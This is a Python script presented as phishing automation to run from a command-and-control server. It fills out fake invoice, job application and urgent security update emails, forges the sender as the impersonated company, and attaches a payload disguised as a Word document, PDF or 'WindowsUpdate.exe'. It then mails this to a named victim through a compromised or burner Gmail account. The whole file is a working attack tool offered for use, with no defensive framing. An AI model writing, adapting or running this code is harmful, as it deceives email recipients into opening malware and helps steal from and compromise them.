# phishing_campaign.py - Complete phishing automation
# Run this on your C2 server to generate and send phishing emails

import smtplib
import random
import string
import base64
import os
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders

class PhishingCampaign:
    def __init__(self):
        self.smtp_servers = [
            {"server": "smtp.gmail.com", "port": 587},
            {"server": "smtp.office365.com", "port": 587},
            {"server": "smtp.mail.yahoo.com", "port": 587}
        ]
        
        self.templates = {
            "invoice": {
                "subject": "Invoice #{id} - Payment Required",
                "body": """
                <html>
                <body style="font-family: Arial;">
                    <h2>Invoice from {company}</h2>
                    <p>Dear {name},</p>
                    <p>Please find your invoice attached.</p>
                    <table border="1" style="border-collapse: collapse;">
                        <tr><td>Invoice #:</td><td>{id}</td></tr>
                        <tr><td>Amount:</td><td>${amount}</td></tr>
                        <tr><td>Due Date:</td><td>{date}</td></tr>
                    </table>
                    <p><b>Password: {password}</b></p>
                    <br>
                    <p>Best regards,<br>{company} Accounts</p>
                </body>
                </html>
                """
            },
            
            "resume": {
                "subject": "Job Application - {position}",
                "body": """
                <html>
                <body style="font-family: Arial;">
                    <h2>Job Application</h2>
                    <p>Dear Hiring Manager,</p>
                    <p>I am applying for the {position} position.</p>
                    <p>My resume and portfolio are attached.</p>
                    <br>
                    <p>Best regards,<br>{name}</p>
                </body>
                </html>
                """
            },
            
            "update": {
                "subject": "URGENT: Security Update Required",
                "body": """
                <html>
                <body style="font-family: Arial;">
                    <div style="background: #ff0000; color: white; padding: 10px;">
                        <h2>⚠ CRITICAL SECURITY UPDATE</h2>
                    </div>
                    <p>A critical vulnerability has been detected on your system.</p>
                    <p>Please run the attached update immediately.</p>
                    <p><b>Deadline: 24 hours</b></p>
                    <p>- IT Security Team</p>
                </body>
                </html>
                """
            }
        }
    
    def send_phishing_email(self, template_name, target_email, target_name, 
                           attachment_path, variables):
        
        template = self.templates[template_name]
        
        # Create message
        msg = MIMEMultipart()
        msg["From"] = f"Accounts <accounts@{variables['company'].lower()}.com>"
        msg["To"] = target_email
        
        # Customize subject
        subject = template["subject"]
        for key, value in variables.items():
            subject = subject.replace("{" + key + "}", str(value))
        msg["Subject"] = subject
        
        # Customize body
        body = template["body"]
        for key, value in variables.items():
            body = body.replace("{" + key + "}", str(value))
        msg.attach(MIMEText(body, "html"))
        
        # Attach payload
        with open(attachment_path, "rb") as f:
            attachment = MIMEBase("application", "octet-stream")
            attachment.set_payload(f.read())
            encoders.encode_base64(attachment)
            
            # Change extension to match template
            if template_name == "invoice":
                filename = f"Invoice_{variables['id']}.doc"
            elif template_name == "resume":
                filename = f"Resume_{variables['name']}.pdf"
            else:
                filename = "WindowsUpdate.exe"
                
            attachment.add_header(
                "Content-Disposition",
                f"attachment; filename={filename}"
            )
            msg.attach(attachment)
        
        # Send via SMTP (use compromised or disposable account)
        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login("your-burner@gmail.com", "app-password")
            server.send_message(msg)
            server.quit()
            print(f"[+] Email sent to {target_email}")
            return True
        except Exception as e:
            print(f"[!] Failed: {e}")
            return False

# Usage
if __name__ == "__main__":
    campaign = PhishingCampaign()
    
    # Generate random invoice number
    invoice_id = ''.join(random.choices(string.digits, k=8))
    
    # Variables for template
    vars = {
        "id": invoice_id,
        "company": "TechCorp",
        "name": "John Smith",
        "amount": "1,250.00",
        "date": "2024-12-31",
        "password": "Secure123!"
    }
    
    # Send phishing email with malicious attachment
    campaign.send_phishing_email(
        template_name="invoice",
        target_email="victim@company.com",
        target_name="John Smith",
        attachment_path="Invoice_2024.doc",
        variables=vars
    )